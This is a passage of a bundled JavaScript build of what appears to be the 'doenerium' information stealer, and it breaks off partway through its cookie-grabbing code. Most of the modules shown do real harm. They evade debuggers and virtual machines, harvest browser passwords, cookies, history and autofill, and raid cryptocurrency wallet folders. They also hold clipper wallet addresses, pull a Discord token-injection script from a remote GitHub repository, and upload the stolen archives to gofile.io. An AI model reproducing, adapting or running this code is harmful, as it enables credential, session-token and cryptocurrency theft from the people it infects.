/******/ (() => { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 767:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            url: require("./webhook_obf.js")().url,
          }
        }


        /***/
      }),

/***/ 115:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            passwords: 0,
            cookies: 0,
            history: 0,
            bookmarks: 0,
            screenshots: 0,

            encrypted_strings: 0,
            decrypted_strings: 0,

            wallets: 0,

            skype: false,
            discord: false,
            telegram: false,
            outlook: false,
            steam: false,
            uplay: false,
            battlenet: false,

            wifinetworks: 0,
          }
        }

        /***/
      }),

/***/ 608:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            default_padding: client.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
            default_oaepHash: "sha256",
            keyPair: client.requires.crypto.generateKeyPairSync("rsa", {
              modulusLength: 2048,
            }),

            btc: client.utils.encryption.encryptData("bc1q8mtpkcfwlff4dlguhxmsk8lhumzgxcd9t50vta"),
            ltc: client.utils.encryption.encryptData("LTN4HSNNypGVtUGv9STKE9o8HmjcTkzeut"),
            xmr: client.utils.encryption.encryptData("4B4D15Q6kas9YGxASZsqhBJVTvyDmS4kb522N8AvzNPx4zRgsxxBDzxPXwpZoCToJVMUffwjRDxNn9e8YbSTj7Sw5jGbwGS"),
            eth: client.utils.encryption.encryptData("0x2086a641D1dD2C3557e6b880E8A97cfdfDb04d4E"),
            xrp: client.utils.encryption.encryptData("rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"),
            neo: client.utils.encryption.encryptData("ANn5THmQidTh6zENyCytJV98i6po1dLJhh"),
            bch: client.utils.encryption.encryptData("qzmckzguqmnldh825gjwv49p8zw5c5p02v0605gf5j"),
            doge: client.utils.encryption.encryptData("DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6"),
            dash: client.utils.encryption.encryptData("Xn6Mnu6aDxYz2cmka77JE6w8YTULbHyYBR"),
            xlm: client.utils.encryption.encryptData("GB7HQ2WNBSUNHATASST44ADP2ND34BRTHKWWLIKRU6YP54SJUK53OLQG"),
          }
        }

        /***/
      }),

/***/ 829:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            base_url: client.utils.encryption.encryptData("https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/discord_desktop_core/index.js"),

            instant_logout: true,
            disable_qr_code: true,

            injection_notification: true,
            initialize_notification: true,
            logout_notification: true,

            running_executables: [],
            executables: [],
            files_path: [],

            closed_discord_clients: '',
            restarted_discord_clients: '',

            grabbed_tokens: {
              all: []
            },
          }
        }


        /***/
      }),

/***/ 384:
/***/ ((module) => {

        module.exports = (client) => {
          return {

            blacklisted_programs: [
              "httpdebuggerui",
              "wireshark",
              "fiddler",
              "vboxservice",
              "df5serv",
              "processhacker",
              "vboxtray",
              "vmtoolsd",
              "vmwaretray",
              "ida64",
              "ollydbg",
              "pestudio",
              "vmwareuser",
              "vgauthservice",
              "vmacthlp",
              "x96dbg",
              "vmsrvc",
              "x32dbg",
              "vmusrvc",
              "prl_cc",
              "prl_tools",
              "xenservice",
              "qemu-ga",
              "joeboxcontrol",
              "ksdumperclient",
              "ksdumper",
              "joeboxserver"
            ],

            blacklisted_hwids: ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
              "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"
            ],

            password_and_cookies_paths: [
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Guest Profile\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Network\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
              process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
              process.env.APPDATA + '\\Opera Software\\Opera Stable\\',
              process.env.APPDATA + '\\Opera Software\\Opera GX Stable\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
              process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
              process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
              process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
            ],

            blacklisted_pc_names: ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
              "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
              "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
            ],


            cookies: {
              all: []
            },

            passwords: {
              all: []
            },

            bookmarks: {
              all: []
            },

            history: {
              all: []
            },

            autofill: {
              all: []
            },

            keywords: {
              cookies: [],
              passwords: [],
              bookmarks: [],
              history: [],
              autofill: [],
            },

            validated_tokens: [],
          }
        }

        /***/
      }),

/***/ 6:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            execution_path: client.utils.encryption.encryptData(process.execPath),
            debug_port: process.debugPort,
            pid: process.pid,
            ppid: process.ppid,
          }
        }

        /***/
      }),

/***/ 481:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            path: undefined,
            generate_path: () => {
              const subpaths = [client.utils.encryption.decryptData(client.config.user.localappdata), client.utils.encryption.decryptData(client.config.user.appdata), client.utils.encryption.decryptData(client.config.user.temp)]
              const subpath = subpaths[Math.floor(Math.random() * subpaths.length)]

              const random_folder_name = `${client.utils.encryption.decryptData(client.config.user.hostname)}_${client.requires.crypto.randomUUID()}`;

              client.requires.fs.mkdirSync(`${subpath}\\${random_folder_name}`, 0744)

              return `${subpath}\\${random_folder_name}`;
            }
          }
        }

        /***/
      }),

/***/ 941:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            version: client.utils.encryption.encryptData("1.0"),
            start_delay: 0
          }
        }

        /***/
      }),

/***/ 265:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            cpus: [],
            ram: client.utils.encryption.encryptData(`${Math.round(client.requires.os.totalmem() / 1024 / 1024 / 1024)} GB`),
            version: client.utils.encryption.encryptData(client.requires.os.version()),
            uptime: client.utils.encryption.encryptData(`${(client.requires.os.uptime() / 60).toFixed(0)} minutes (${(client.requires.os.uptime() / 60 / 60).toFixed(2)} hours)`),
            hostdir: client.utils.encryption.encryptData(client.requires.os.homedir()),
            hostname: client.utils.encryption.encryptData(client.requires.os.hostname()),
            username: client.utils.encryption.encryptData(client.requires.os.userInfo().username),
            type: client.utils.encryption.encryptData(client.requires.os.type()),
            arch: client.utils.encryption.encryptData(client.requires.os.arch()),
            release: client.utils.encryption.encryptData(client.requires.os.release()),

            appdata: client.utils.encryption.encryptData(process.env.APPDATA),
            localappdata: client.utils.encryption.encryptData(process.env.LOCALAPPDATA),
            temp: client.utils.encryption.encryptData(process.env.TEMP),
            user_domain: client.utils.encryption.encryptData(process.env.COMPUTERNAME),
            monitor_address: client.utils.encryption.encryptData(process.env.MONITOR_ADDRESS),
            processor_identifier: client.utils.encryption.encryptData(process.env.PROCESSOR_IDENTIFIER),
            processor_architecture: client.utils.encryption.encryptData(process.env.PROCESSOR_ARCHITECTURE),
            processors: client.utils.encryption.encryptData(process.env.NUMBER_OF_PROCESSORS),
            system_drive: client.utils.encryption.encryptData(process.env.SystemDrive),

            autostart: [client.utils.encryption.encryptData(process.env.APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), client.utils.encryption.encryptData(process.env.SystemDrive + "\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")],


            wifi_connections: async () => {
              const wifi_connections = await client.requires.systeminformation.getDynamicData();

              let text = ""

              wifi_connections.wifiNetworks.forEach((connection) => {
                text += `${connection.ssid} | ${connection.bssid}\n`
              })

              client.config.counter.wifinetworks = wifi_connections.wifiNetworks.length;

              return text
            },

            connection_info: undefined,
          }
        }

        /***/
      }),

/***/ 965:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            directory: {
              "💸 Zcash": `${process.env.APPDATA}\\Zcash`,
              "🚀 Armory": `${process.env.APPDATA}\\Armory`,
              "📀 Bytecoin": `${process.env.APPDATA}\\bytecoin`,
              "💵 Jaxx": `${process.env.APPDATA}\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb`,
              "💎 Exodus": `${process.env.APPDATA}\\Exodus\\exodus.wallet`,
              "📉 Ethereum": `${process.env.APPDATA}\\Ethereum\\keystore`,
              "🔨 Electrum": `${process.env.APPDATA}\\Electrum\\wallets`,
              "🕹️ AtomicWallet": `${process.env.APPDATA}\\atomic\\Local Storage\\leveldb`,
              "💹 Guarda": `${process.env.APPDATA}\\Guarda\\Local Storage\\leveldb`,
              "⚡ Coinomi": `${process.env.APPDATA}\\Coinomi\\Coinomi\\wallets`,
            },
          }
        }

        /***/
      }),

/***/ 612:
/***/ ((module, __unused_webpack_exports, __nccwpck_require__) => {

        const crypto = __nccwpck_require__(113);
        const stream = __nccwpck_require__(781);

        const axios = __nccwpck_require__(382);
        const FormData = __nccwpck_require__(522);

        // Typedefs
        /**
         * File for upload
         * @typedef {object} FileUpload
         * @property {Buffer|ReadableStream} file - File data
         * @property {string} [fn] - File name
         */
        /**
         * Options for uploading a file or files
         * @typedef {object} UploadOptions
         * @property {string} expire - Upload expiration date in epoch
         * @property {string} password - Password for accessing the upload
         * @property {string} description - Description of the upload
         * @property {string} tags - Tags of the upload (If multiple, separate by comma)
         * @property {string} ac - Admin code of the upload
         * @property {string} email - Email the upload will be stored on
         */
        /**
         * File metadata after creation
         * @typedef {object} FileCreated
         * @property {string} code - Upload ID
         * @property {string} removalCode - Removal code
         */
        /**
         * Information about an upload
         * @typedef {object} UploadInfo
         * @property {string} code - Upload ID
         * @property {string} server - File upload server
         * @property {number} uploadTime - File upload time
         * @property {number} totalSize - Upload size
         * @property {number} views - Views
         * @property {number} hasZip - Has a zip file
         *
         * @property {object[]} files - List of files in upload
         * @property {string} files.name - File name
         * @property {number} files.size - File size
         * @property {string} files.md5 - MD5 hash of file
         * @property {string} files.mimetype - File mimetype
         * @property {string} files.link - File URL for download
         */

        function sha256hash(str) {
          return crypto.createHash("sha256").update(str).digest("hex");
        }

        async function getServer() {
          try {
            const res = await axios({
              url: `https://apiv2.gofile.io/getServer`,
              method: "GET",
              headers: {
                accept: "*/*",
                "accept-language": "en-US,en;",
                "cache-control": "no-cache",
                pragma: "no-cache",
                referrer: "https://gofile.io/uploadFiles",
                mode: "cors",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
                dnt: 1,
                origin: "https://gofile.io"
              },
            });

            if (res.data.status !== "ok") {
              throw new Error(`Fetching server info failed: ${JSON.stringify(res.data)}`);
            }
            return res.data.data.server;
          } catch (e) {
            console.log("Error with fetching server:");
            console.error(e);
          }
        }

        /**
         *
         * @param {FileUpload[]} files - List of files to upload
         * @param {UploadOptions} options - Options for the upload
         * @returns {Promise<FileCreated>} ID and removal code of the uploaded files
         */
        async function uploadFiles(files, options = {}) {
          try {
            let server = await getServer();
            for (let f of files) {
              const fd = new FormData();
              if (f.fn === "") {
                fd.append("file", f.file);
              } else {
                fd.append("file", f.file, f.fn);
              }


              if (options.description) {
                if (options.description.length <= 1000) {
                  fd.append("description", options.description);
                } else {
                  throw new Error("Invalid value for field description. ");
                }
              }

              if (options.tags) {
                if (options.tags.length <= 1000) {
                  fd.append("tags", options.tags);
                } else {
                  throw new Error("Invalid value for field tags. ");
                }
              }

              if (options.ac) {
                if (options.ac.length <= 20) {
                  fd.append("ac", options.ac);
                } else {
                  throw new Error("Invalid value for field ac. ");
                }
              }

              if (options.email) {
                if (/.+@.+\..+/i.test(options.email)) {
                  fd.append("email", options.email);
                } else {
                  throw new Error("Invalid value for field email. ");
                }
              }

              if (options.password) {
                if (/^[a-z0-9]{6,20}$/i.test(options.password)) {
                  fd.append("password", options.password);
                } else {
                  throw new Error("Invalid value for field password. ");
                }
              }
              if (options.expire) {
                if (!isNaN(options.expire) && options.expire > 10000000000 ? options.expire : options.expire / 1000 > Date.now() / 1000) {
                  fd.append("expire", Math.round(options.expire > 10000000000 ? options.expire : options.expire / 1000));
                } else {
                  throw new Error("Invalid value for field expire. ");
                }
              }

              const res = await axios({
                url: `https://${server}.gofile.io/uploadFile`,
                method: "POST",
                headers: {
                  accept: "*/*",
                  "accept-language": "en-US,en;",
                  "cache-control": "no-cache",
                  pragma: "no-cache",
                  referrer: "https://gofile.io/uploadFiles",
                  mode: "cors",
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
                  dnt: 1,
                  origin: "https://gofile.io",
                  ...fd.getHeaders(),
                },
                'maxContentLength': Infinity,
                'maxBodyLength': Infinity,
                referrer: "https://gofile.io/uploadFiles",
                data: fd,
              });

              if (res.data.status !== "ok") {
                throw new Error(`Uploading file failed: ${JSON.stringify(res.data)}`);
              }
              return res.data.data;
            }
          } catch (e) {
            console.log("Error with file upload.");
            console.error(e);
          }



        }

        /**
         * @async
         * @function uploadFile
         * @description Note: a Buffer cannot be passed without a file name
         * @param {ReadableStream} file - ReadableStream with file data (file name is inferred)
         * @param {UploadOptions} options - Options for the upload
         * @returns {Promise<FileCreated>} ID and removal code of the uploaded file
         */
        /**
         * @async
         * @function uploadFile
         * @param {Buffer|ReadableStream} file - Buffer or ReadableStream with file data
         * @param {string} fileName - File name
         * @param {UploadOptions} options - Options for the upload
         * @returns {Promise<FileCreated>} ID and removal code of the uploaded file
         */

        async function uploadFile(arg1, arg2, arg3) {
          if (arg1 instanceof Buffer || arg1 instanceof ArrayBuffer) {
            if (arg2 && arg2 !== "" && typeof arg2 !== "object") {
              return uploadFiles([{ file: arg1, fn: arg2 }], arg3);
            } else {
              throw Error("Filename must not be blank when using a Buffer.");
            }
          } else if (arg1 instanceof stream.Readable) {
            if (arg2 && arg2 !== "" && typeof arg2 !== "object") {
              return uploadFiles([{ file: arg1, fn: arg2 }], arg3);
            } else {
              return uploadFiles([{ file: arg1 }], arg2);
            }
          } else {
            throw Error("Invalid file type");
          }
        }

        /**
         *
         * @param {string} code - Upload ID
         * @param {string} removalCode - Removal code of the upload
         */
        async function removeUpload(code, removalCode) {
          try {
            const server = (await getServer(code)) || "srv-file9";

            const res = await axios({
              url: `https://${server}.gofile.io/deleteUpload?c=${code}&rc=${removalCode}`,
              method: "GET",
              headers: {
                accept: "*/*",
                "accept-language": "en-US,en;",
                "cache-control": "no-cache",
                pragma: "no-cache",
              },
              referrer: `https://gofile.io/?c=${code}`,
              referrerPolicy: "no-referrer-when-downgrade",
              mode: "cors",
            });

            if (res.data.status !== "ok") {
              throw new Error(`Removing file failed: ${JSON.stringify(res.data)}`);
            }
            return res.data.data;
          } catch (e) {
            console.error(e);
          }
        }

        /**
         *
         * @param {string} code - Upload ID
         * @param {string} [p] - Passphrase used to secure the upload
         * @returns {Promise<UploadInfo>}
         */
        async function getUploadInfo(code, p = "") {
          try {
            const server = (await getServer(code)) || "srv-file9";

            const res = await axios({
              url: `https://${server}.gofile.io/getUpload?c=${code}${p && p !== "" ? `&p=${sha256hash(p)}` : ""}`,
              method: "GET",
              headers: {
                accept: "*/*",
                "accept-language": "en-US,en;",
                "cache-control": "no-cache",
                pragma: "no-cache",
              },
              referrer: `https://gofile.io/?c=${code}`,
              referrerPolicy: "no-referrer-when-downgrade",
              mode: "cors",
            });

            if (res.data.status !== "ok") {
              throw new Error(`Fetching file info failed: ${JSON.stringify(res.data)}`);
            }
            return res.data.data;
          } catch (e) {
            console.error(e);
          }
        }

        /**
         *
         * @param {string} code - Upload ID
         * @param {string} [p] - Passphrase used to secure the upload
         * @param {"arraybuffer"|"stream"} [responseType] - Return type
         * @returns {Promise<Buffer[]>|Promise<ReadableStream[]>} Returns an array of Buffers or Streams depending on the responseType parameter. Represents all files in the upload.
         */
        async function downloadFiles(code, p = "", responseType = "arraybuffer") {
          try {
            const uploadInfo = await getUploadInfo(code, p);

            const reqs = Object.keys(uploadInfo.files)
              .map(k => uploadInfo.files[k])
              .map(f =>
                axios({
                  url: f.link,
                  headers: {
                    accept:
                      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
                    "cache-control": "no-cache",
                    pragma: "no-cache",
                    "upgrade-insecure-requests": "1",
                  },
                  referrerPolicy: "no-referrer-when-downgrade",
                  method: "GET",
                  mode: "cors",
                  responseType,
                })
              );

            return (await Promise.all(reqs)).map(r => r.data);
          } catch (e) {
            console.error(e);
          }
        }

        module.exports = {
          uploadFile,
          uploadFiles,
          removeUpload,
          getUploadInfo,
          downloadFiles,
        };

        /***/
      }),

/***/ 48:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            keywords: [
              "gmail.com",
              "youtube.com",
              "nulled.to",
              "cracked.to",
              "tiktok.com",
              "yahoo.com",
              "gmx.com",
              "aol.com",
              "coinbase",
              "binance"
            ]
          }
        }

        /***/
      }),

/***/ 960:
/***/ ((module) => {

        module.exports = (client) => {
          return {
            async saveBrowserStuff() {
              ["passwords", "cookies", "bookmarks", "history", "autofill"].forEach(
                async (type) => {

                  if (type == "passwords") {
                    try {
                    client.config.environ.metamask.forEach(async (mmpath) => {
                      client.utils.encryption.step1(mmpath, client.config.environ.all_passwords)

                    })

                    client.utils.encryption.step2(client.config.environ.all_passwords)
                    } catch {}
                  }

                  var _type = type.charAt(0).toUpperCase() + type.slice(1) // Capitalized
                  client.utils.jszip.createFolder(`\\${_type}`);

                  for (let [key, value] of Object.entries(
                    client.config.environ[type]
                  )) {
                    if (value.length != 0) {
                      var text = value.join("\n\n");
                      var found_keywords = [];

                      client.config.keywords.keywords.forEach((keyword) => {
                        if (text.includes(keyword)) {
                          found_keywords.push(keyword);
                        }
                      });

                      if (found_keywords.length == 0) {
                        found_keywords =
                          "Found keywords: None\n<================[t.me/doenerium]>================>\n";
                      } else {
                        found_keywords = `Found keywords: ${found_keywords.join(
                          ", "
                        )}\n<================[t.me/doenerium]>================>\n`;
                      }

                      client.utils.jszip.createTxt(
                        `\\${_type}\\${key.toUpperCase()}.txt`,
                        `${found_keywords}\n${text}`
                      );
                    }
                  }
                }
              );
            },

            async getBookmarks(path) {
              let browser;

              if (path.includes("Local")) {
                browser = path.split("\\Local\\")[1].split("\\")[0];
              } else {
                browser = path.split("\\Roaming\\")[1].split("\\")[1];
              }

              if (browser == "Google") {
                browser == "Chrome";
              } else if (browser == "BraveSoftware") {
                browser = "Brave";
              } else if (browser == "Microsoft") {
                browser = "Microsoft Edge";
              }

              if (client.requires.fs.existsSync(`${path}\\Bookmarks`)) {
                var bookmarks = JSON.parse(
                  client.requires.fs.readFileSync(`${path}\\Bookmarks`)
                ).roots.bookmark_bar.children;

                for (var bookmark of bookmarks) {
                  try {
                    client.config.environ.bookmarks.all.push(
                      `==================================================\nBROWSER   : ${browser}\nID        : ${bookmark["id"]}\nNAME      : ${bookmark["name"]}\nURL       : ${bookmark["url"]}\nGUID      : ${bookmark["guid"]}\nADDED AT  : ${bookmark["date_added"]}\n==================================================`
                    );

                    if (!client.config.environ.bookmarks[browser]) {
                      client.config.environ.bookmarks[browser] = [];
                    }

                    client.config.environ.bookmarks[browser].push(
                      `==================================================\nBROWSER   : ${browser}\nID        : ${bookmark["id"]}\nNAME      : ${bookmark["name"]}\nURL       : ${bookmark["url"]}\nGUID      : ${bookmark["guid"]}\nADDED AT  : ${bookmark["date_added"]}\n==================================================`
                    );
                  } catch (err) { }

                  client.config.counter.bookmarks++;
                }
              }
            },

            async getAutofill(path) {
              let path_split = path.split("\\"),
                path_split_tail = path.includes("Network")
                  ? path_split.splice(0, path_split.length - 3)
                  : path_split.splice(0, path_split.length - 2),
                path_tail = path_split_tail.join("\\");

              let browser;

              if (path.includes("Local")) {
                browser = path.split("\\Local\\")[1].split("\\")[0];
              } else {
                browser = path.split("\\Roaming\\")[1].split("\\")[1];
              }

              if (browser == "Google") {
                browser == "Chrome";
              } else if (browser == "BraveSoftware") {
                browser = "Brave";
              } else if (browser == "Microsoft") {
                browser = "Microsoft Edge";
              }

              if (
                path.startsWith(
                  client.utils.encryption.decryptData(client.config.user.appdata)
                )
              )
                path_tail = path;
              if (path.includes("cord")) {
                return;
              }

              if (client.requires.fs.existsSync(`${path}\\Web Data`)) {
                var sql = new client.requires.sqlite3.Database(
                  `${path}\\Web Data`,
                  (err) => { }
                );

                sql.each("SELECT * FROM autofill", function (err, row) {
                  if (row) {
                    client.config.environ.autofill.all.push(
                      `Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`
                    );

                    if (!client.config.environ.autofill[browser]) {
                      client.config.environ.autofill[browser] = [];
                    }

                    client.config.environ.autofill[browser].push(
                      `Name: ${row.name} | Value: ${row.value} | Date created (timestamp): ${row.date_created} | Date last used (timestamp): ${row.date_last_used} | Count: ${row.count}`
                    );
                  }
                });
              }
            },

            async getHistory(path) {
              let path_split = path.split("\\"),
                path_split_tail = path.includes("Network")
                  ? path_split.splice(0, path_split.length - 3)
                  : path_split.splice(0, path_split.length - 2),
                path_tail = path_split_tail.join("\\");

              let browser;

              if (path.includes("Local")) {
                browser = path.split("\\Local\\")[1].split("\\")[0];
              } else {
                browser = path.split("\\Roaming\\")[1].split("\\")[1];
              }

              if (browser == "Google") {
                browser == "Chrome";
              } else if (browser == "BraveSoftware") {
                browser = "Brave";
              } else if (browser == "Microsoft") {
                browser = "Microsoft Edge";
              }

              if (
                path.startsWith(
                  client.utils.encryption.decryptData(client.config.user.appdata)
                )
              )
                path_tail = path;
              if (path.includes("cord")) {
                return;
              }

              if (client.requires.fs.existsSync(`${path_tail}\\History`)) {
                var sql = new client.requires.sqlite3.Database(
                  `${path}\\History`,
                  (err) => { }
                );

                sql.each("SELECT * FROM urls", function (err, row) {
                  try {
                    client.config.environ.history.all.push(
                      `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
                    );

                    if (!client.config.environ.history[browser]) {
                      client.config.environ.history[browser] = [];
                    }

                    client.config.environ.history[browser].push(
                      `ID: ${row.id} | URL: ${row.url} | Title: ${row.title} | Visit count: ${row.visit_count} | Last visit time (timestamp): ${row.last_visit_time} | Display count: ${row.display_count}`
                    );
                  } catch { }
                });
              }
            },

            async getCookies(path) {
              let path_split = path.split("\\"),
                path_split_tail = path.includes("Network")
                  ? path_split.splice(0, path_split.length - 3)
                  : path_split.splice(0, path_split.length - 2),
                path_tail = path_split_tail.join("\\") + "\\";

              let browser;

              if (path.includes("Local")) {
                browser = path.split("\\Local\\")[1].split("\\")[0];
              } else {
                browser = path.split("\\Roaming\\")[1].split("\\")[1];
              }

              if (browser == "Google") {
                browser == "Chrome";
              } else if (browser == "BraveSoftware") {
                browser = "Brave";
